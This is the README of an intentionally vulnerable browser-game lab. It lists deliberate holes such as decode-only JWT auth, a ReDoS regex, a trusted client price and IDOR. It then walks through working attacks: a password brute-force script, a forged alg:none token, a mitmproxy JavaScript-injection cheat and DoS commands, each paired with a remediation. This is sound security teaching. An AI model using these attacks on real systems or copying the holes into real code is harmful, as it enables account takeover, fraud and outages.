# Stickman Shooter

A Phaser 3 browser shooter with a Node.js/Express + PostgreSQL backend. Three game modes — **Player vs AI**, **Local PvP** (same screen), and **Online PvP** (P2P via PeerJS room codes) — across three selectable maps with real animated soldier sprites.

Built as a deliberate cybersecurity lab with intentionally vulnerable endpoints for Burp Suite / mitmproxy testing. A hardened twin (`server-secure.js`) is included for the before/after remediation story.

## Database setup (PostgreSQL)

1. Install and start PostgreSQL locally (default port `5432`).
2. Create the database:

```sql
CREATE DATABASE stickman;
```

3. Configure the connection. Edit the `Pool` in `server.js` or set the matching environment variables (defaults shown):

| Env var     | Default          |
|-------------|------------------|
| `PGHOST`    | `localhost`      |
| `PGPORT`    | `5432`           |
| `PGUSER`    | `postgres`       |
| `PGPASSWORD`| `yourpassword`   |
| `PGDATABASE`| `stickman`       |

Quick start

1. Install dependencies:

```bash
npm install
```

2. Start the server (creates `users` and `friends` tables `IF NOT EXISTS`, seeds `thant` and `player1`, then serves the frontend and API):

```bash
npm start
```

3. Open http://localhost:3000/ in your browser.

## Seeded accounts

| Username | Password | Diamonds | Skins unlocked        |
|----------|----------|----------|-----------------------|
| `thant`  | `1111`   | `9999`   | default, gold, stealth, neon |
| `player1`| `player1`| `200`    | default, gold         |

On every start the seed routine synchronizes these accounts (resetting diamonds/password, merging unlocked skins).

### Game features

- **Soldier character sprites** — helmeted soldier with jetpack flame, 2-frame walk cycle, per-skin colours. Replaces the original stickman.
- **Three selectable maps** — Classic (default layout), Towers (high platforms), Ruins (scattered cover). Map select screen appears before PvA and Local PvP; host picks for Online PvP.
- **Auto-random** — if no map is chosen within 10 seconds, a random map is selected automatically.
- **Online PvP room system** — host creates a room, copies a short code, shares it with a friend. Host picks the map and the guest follows. A **COPY CODE** button makes sharing easy.
- **Three game modes** — Player vs AI (PvA), Local PvP (same screen, two keyboards), Online PvP (P2P via PeerJS).
- **Docker hosting** — `docker compose up -d --build` runs the game + PostgreSQL, accessible to friends via your public IP or a free ngrok tunnel.

### Backend

- Express + PostgreSQL backend in `server.js` with `/api/signup`, `/api/login`, `/api/me`, `/api/skins`, `/api/purchase`, `/api/award`, `/api/player/state`, `/api/validate-user`, `/api/user/update-profile`, `/api/friends/remove`.
- New players start with 0 diamonds (no free starter diamonds).
- Demo payment UI is present but real payment is disabled — purchases are shown as a USD demo image and cannot be completed in this demo.
- Frontend UI at `shooter/ui.js` for login/signup and shop; a login overlay blocks gameplay until you sign in.
- Skins integrated into `shooter/game1.js` (sprite textures) and `window.GameAPI.setLocalSkin()` to apply selection.
- AI uses the jetpack/jet engine (chases vertically and closes distance).
- Lightweight SFX and background music via WebAudio.

## API Endpoints

| Method | Path                    | Auth   | Description                                              | Vulnerability         |
|--------|-------------------------|--------|----------------------------------------------------------|-----------------------|
| POST   | `/api/signup`           | No     | Create a new user account                                |                       |
| POST   | `/api/login`            | No     | Log in, returns JWT token                                |                       |
| GET    | `/api/me`               | JWT    | Get profile (trusts `userId` query param)                | IDOR (#5)             |
| POST   | `/api/user/update-profile`| JWT  | Update profile fields (trusts `userId` in body)          | IDOR (#5)             |
| GET    | `/api/skins`            | No     | List available skins and prices                          |                       |
| GET    | `/api/demo-packs`       | No     | List diamond purchase packs                              |                       |
| POST   | `/api/purchase`         | No     | Purchase skin (trusts client `price`)                    | Tampering (#3)        |
| POST   | `/api/buy-diamonds`     | JWT    | Buy diamonds with demo pack (admin only)                 |                       |
| POST   | `/api/award`            | JWT    | Award diamonds/health/score (no validation)              | Mass Assignment (#4)  |
| POST   | `/api/player/state`     | JWT    | Write arbitrary game state (no validation)               | Mass Assignment (#4)  |
| POST   | `/api/select-skin`      | JWT    | Select active skin                                       |                       |
| POST   | `/api/validate-user`    | No     | Check username with ReDoS regex                          | ReDoS (#2)            |
| POST   | `/api/friends/remove`   | JWT    | Remove friend (trusts `targetUserId` in body)            | IDOR (#5)             |

Notes
- This is a simple demo backend. For production use, change `SECRET`, add robust validation, HTTPS, and stronger security.
- The server serves static files from the `shooter/` folder.
- The backend uses the `pg` connection pool. All queries use PostgreSQL `$1, $2, ...` parameterized placeholders and `pool.query()`.
- This project is intentionally vulnerable for cybersecurity testing. The vulnerabilities preserved for Burp Suite evidence are:
  - **JWT Signature Bypass** — `authMiddleware` uses `jwt.decode()` instead of `jwt.verify()`, accepting forged/`none`-algorithm tokens.
  - **ReDoS / Algorithmic DoS** — `POST /api/validate-user` uses the catastrophic backtracking regex `^([a-zA-Z0-9]+)+$`.
  - **Shop Parameter Tampering** — `POST /api/purchase` trusts the client-supplied `price` (no server-side validation).
  - **Mass Assignment** — `POST /api/award` and `POST /api/player/state` accept arbitrary `diamonds`/`health`/`score` values without limits.
  - **IDOR / Account Theft** — `GET /api/me`, `POST /api/user/update-profile`, and `POST /api/friends/remove` trust a client-supplied `userId`/`targetUserId` instead of the token identity.

## Attacks demonstrated (Burp Suite & mitmproxy lab)

Three end-to-end attacks were performed against this application. Each section lists the tool, the exact payload, reproduction steps, evidence, impact, and remediation.

### Attack 1 — Password Dictionary Attack (`/api/login`)

- **Class:** Broken Authentication — no rate limiting, no lockout, weak seeded password (`thant` / `1111`).
- **Tools:** Burp Suite Intruder (Sniper) + `rockyou.txt` (or a Python `requests` loop for full-scale runs).

**Steps**

1. Log in from the browser (proxied through Burp) with dummy credentials and capture `POST /api/login` in **HTTP history** → right-click → **Send to Intruder**.
2. Attack type **Sniper**, mark only the password value:
   ```
   POST /api/login HTTP/1.1
   Host: 192.168.56.1:3000
   Content-Type: application/json

   {"username":"thant","password":§1111§"}
   ```
3. Payloads → **Simple list** → load `rockyou.txt` (ensure `1111` is present).
4. **Settings → Grep – Match:** add `"token"` so the hit column ticks on success.
5. Run. Every wrong password → `400 {"error":"Invalid credentials"}`; the match (`1111`) → `200` with `"token":"eyJ..."` and a result chart tick.

**Full-scale alternative (faster than Community Intruder):**
```python
import requests
url = "http://192.168.56.1:3000/api/login"
for p in open("/usr/share/wordlists/rockyou.txt", errors="ignore").read().splitlines():
    r = requests.post(url, json={"username": "thant", "password": p}, timeout=5)
    if r.status_code == 200:
        print("[+] PASSWORD FOUND:", p)
        break
```

**Evidence:** Intruder result table sorted on the `token` column showing the single `200` hit at `1111` among `400` failures.

**Impact:** Full account takeover of any account with a guessable password (incl. the seeded admin).

**Remediation:** `express-rate-limit` (e.g. 5 attempts/min/IP) + temporary account lockout after N failures + password strength policy. After the fix the same attack returns `429 Too Many Requests`.

### Attack 2 — Diamond Manipulation (JWT bypass + Mass Assignment)

- **Class:** Broken Authentication (JWT `alg:none` signature bypass) + Mass Assignment / IDOR.
- **Tool:** Burp Suite Repeater. The `authMiddleware` uses `jwt.decode()` instead of `jwt.verify()`, so a forged unsigned token is accepted.

**Forged token (no signature):**
```
POST /api/player/state HTTP/1.1
Host: 192.168.56.1:3000
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6MTAsInVzZXJuYW1lIjoidGhhbnQzIiwicm9sZSI6ImFkbWluIiwiaXNBZG1pbiI6dHJ1ZX0.

{"diamonds": 999999}
```
Payload decodes to `{"id":10,"username":"thant3","role":"admin","isAdmin":true}` (`alg: none`).

**Request 1 — mass-assignment:**
```
POST /api/player/state   →   {"diamonds": 1000000}   →   200 {"success":true,"updatedState":{"diamonds":1000000}}
```

**Request 2 — unbounded award:**
```
POST /api/award   →   {"diamonds": 500000}   →   200 {"diamonds":1500000,"health":100,"score":0}
```

**Request 3 — IDOR, set any user's balance via `userId`:**
```
POST /api/user/update-profile   →   {"userId": 1, "diamonds": 99999}
```

**Evidence:** profile check shows the inflated balance:
```
GET /api/me?userId=10   →   200 {"id":10,"username":"thant3","diamonds":1500000,...}
```

**Impact:** Unlimited in-app currency; with the forged `alg:none` token any account can be impersonated, defrauded, or taken over.

**Remediation:** `jwt.verify(token, SECRET)` with pinned algorithms (kill the `none` bypass); clamp/validate `diamonds`/`health`/`score` server-side with max limits; never trust client-supplied `userId` — always derive it from the authenticated session.

### Attack 3 — In-Game Play Manipulation (client-side trust, MITM)

- **Class:** Client-side trust — the server is a state *store*, not an authoritative game server. All match state (HP, ammo, reload, jetpack fuel) lives in client JS (`game1.js`), so whoever controls the served JavaScript controls the match.
- **Tool:** mitmproxy / mitmweb mitmproxy addon + a proxied browser in an attacker VM.

**Setup**
```bash
pip3 install --user mitmproxy
cat > cheat.py << 'EOF'
from mitmproxy import http
import re

def response(flow: http.HTTPFlow):
    if "game1.js" in flow.request.pretty_url:
        t = flow.response.get_text()
        t = re.sub(r"hp: 100, maxHp: 100,",
                   "hp: isP1 ? 999999 : 100, maxHp: isP1 ? 999999 : 100,", t)
        t = re.sub(r"energy: MAX_ENERGY,",
                   "energy: isP1 ? MAX_ENERGY * 1000 : MAX_ENERGY,", t)
        t = re.sub(r"if \(w\.reloading \|\| w\.mag <= 0\) \{ this\._reload\(char\); return false; \}",
                   "if (char === this.p1Char) { w.mag = 9999; w.reserve = 99999; w.reloading = false; }\n        if (w.reloading || w.mag <= 0) { this._reload(char); return false; }", t)
        t = re.sub(r"if \(now - w\.lastShot < def\.fireRate\) return false;",
                   "if (now - w.lastShot < (char === this.p1Char ? 1 : def.fireRate)) return false;", t)
        t = re.sub(r"owner: char, type: w.type, damage: def\.damage,",
                   "owner: char, type: w.type, damage: char === this.p1Char ? 9999 : def.damage,", t)
        t = re.sub(r"char\.energy = Math\.max\(0, char\.energy - ENERGY_DRAIN \* dt\);",
                   "char.energy = char === this.p1Char ? char.energy : Math.max(0, char.energy - ENERGY_DRAIN * dt);", t)
        t = re.sub(r"char\.energy = Math\.min\(MAX_ENERGY, char\.energy \+ ENERGY_REGEN \* dt\);",
                   "char.energy = char === this.p1Char ? char.energy : Math.min(MAX_ENERGY, char.energy + ENERGY_REGEN * dt);", t)
        flow.response.set_text(t)
        flow.comment = "CHEAT INJECTED (PLAYER ONLY)"
EOF

mitmweb -s cheat.py                 # proxy :8080, Web GUI :8081
```

**Verify the rewrite happens in transit (before touching the browser):**
```bash
curl -x http://127.0.0.1:8080 -s "http://192.168.56.1:3000/game1.js" | grep -c "char === this.p1Char"   # → 5
curl -x http://127.0.0.1:8080 -s "http://192.168.56.1:3000/game1.js" | grep "hp: isP1 ? 999999"
```

**Play with the cheated build:**
```bash
chromium --proxy-server="http://127.0.0.1:8080" --proxy-bypass-list="" http://192.168.56.1:3000/
```

1. In the proxied browser open the game and **Ctrl+Shift+R** (bypass JS cache).
2. Log in (`thant` / `1111`), start a **PvA** match.
3. Player: HP `999999`, ammo `9999/99999`, no reload, instant fire, unlimited jetpack. Enemy AI: normal `100` HP, normal ammo/fuel (guards key on `isP1` / `char === this.p1Char`, and the AI fires through its own `_aiShoot`).

**Evidence:** (1) curl grep output — 5 `p1Char` guards injected; (2) mitmweb flow list with comment `CHEAT INJECTED (PLAYER ONLY)` and the rewritten response body; (3) in-game HUD screenshot; (4) server state untouched — `GET /api/me` unchanged before/after.

**Impact:** Any on-path attacker (evil hotspot, proxied network, compromised CDN) can silently grant the player god-mode; the server cannot tell, because no match state ever crosses the HTTP channel.

**Remediation:** make the server authoritative — send inputs/state changes to the server and let it simulate/validate the match (as done for online PvP messages), and/or serve static game assets over HTTPS with **Subresource Integrity (SRI)** / a signed content hash so tampered JavaScript cannot be trusted.

### Attack 4 — Multi-layer Denial of Service

- **Class:** Availability — algorithmic (ReDoS), resource exhaustion (bcrypt flood), connection exhaustion (slowloris).
- **Tools:** Python scripts in the `dos/` folder run from the attacker VM.

**Layer 1 — ReDoS (single request freezes the server).** `POST /api/validate-user` (server.js:223) uses the catastrophic-backtracking regex `^([a-zA-Z0-9]+)+$`. A payload of ~90000 `a` chars followed by a non-matching `!` forces exponential backtracking, pegs the CPU, and blocks every other endpoint:
```bash
python3 dos/redos.py http://192.168.56.1:3000 90000
# [baseline] /api/skins -> HTTP 200 (0.02s)
# [after]    /api/skins -> TIMEOUT / UNREACHABLE   <- server frozen
```

**Layer 2 — bcrypt login flare.** `/api/login` (no rate limit) runs bcrypt cost 10 (~50-100ms CPU per check); concurrent attackers saturate CPU and the bcrypt threadpool:
```bash
python3 dos/login_flood.py http://192.168.56.1:3000 60 20
# pre-flood login ~0.05s  ->  post-flood login TIMEOUT/seconds
```

**Layer 3 — Slowloris.** Open many sockets and drip-feed headers so Node holds connections until resources are exhausted:
```bash
python3 dos/slowloris.py http://192.168.56.1:3000 300
```

**Evidence:** `top` showing `node` at ~100% CPU; `/api/skins` timing out during ReDoS; login latency before/after the flood; connection build-up under slowloris.

**Remediation (implemented in `server-secure.js`):** bounded regex + length cap on `/api/validate-user` (kills ReDoS), in-memory rate limiting on `/api/login`/`/api/signup`/`/api/validate-user` (kills dictionary + flood, returns `429 Too Many Requests`), body-size limits, and connection-timeout handling. Replay the same scripts against `PORT=3001 node server-secure.js` and all three layers fail. See `dos/README.md` for the full choreography.

---

## Hosting online for friends

Three ways to expose the game over the internet so friends can play Online PvP via room codes.

### Option A — Docker Compose (recommended for VPS / home server)

Requires Docker + Docker Compose installed.

```bash
# From the project root:
docker compose up -d --build
```

This spins up:

- A PostgreSQL 16 container (data persisted in a named volume)
- A Node.js app container serving the game on port 8080

Open `http://YOUR_IP:8080` and share that address — friends play Online PvP using room codes. Change the default JWT secret with `SECRET=yourpassword docker compose up -d --build`.

On a home network, LAN friends use your local IP; for internet access, port-forward your router (8080 → your machine) or use Option B.

### Option B — ngrok quick tunnel (fastest, no config)

Run the game locally first (`node server.js`), then:

```bash
ngrok http 3000
```

ngrok prints a public URL like `https://abc123.ngrok-free.app`. Share it — friends open it in their browser and play Online PvP via room codes. Free ngrok accounts get a new URL each session.

### Option C — Render.com free tier (cloud-hosted, always on)

1. Create a free [Render](https://render.com) account.
2. **New → Web Service** → connect your GitHub repo.
   - Build command: `npm install`
   - Start command: `node server.js`
   - Port: `3000`
3. Add a free **PostgreSQL** database on Render and wire its env vars (`PGHOST`, `PGPORT`, `PGUSER`, `PGPASSWORD`, `PGDATABASE`) to the web service.
4. Set `SECRET` to a strong random value.
5. Deploy — Render gives you `https://yourapp.onrender.com`.

The free tier spins down after inactivity (cold start ~30 s) but works fine for demos/tests.

**Note:** Online PvP is peer-to-peer over PeerJS with room IDs — our server only handles login and the shop, it never relays game traffic. Every hosting option above works for Online PvP as long as both players can open the game URL.
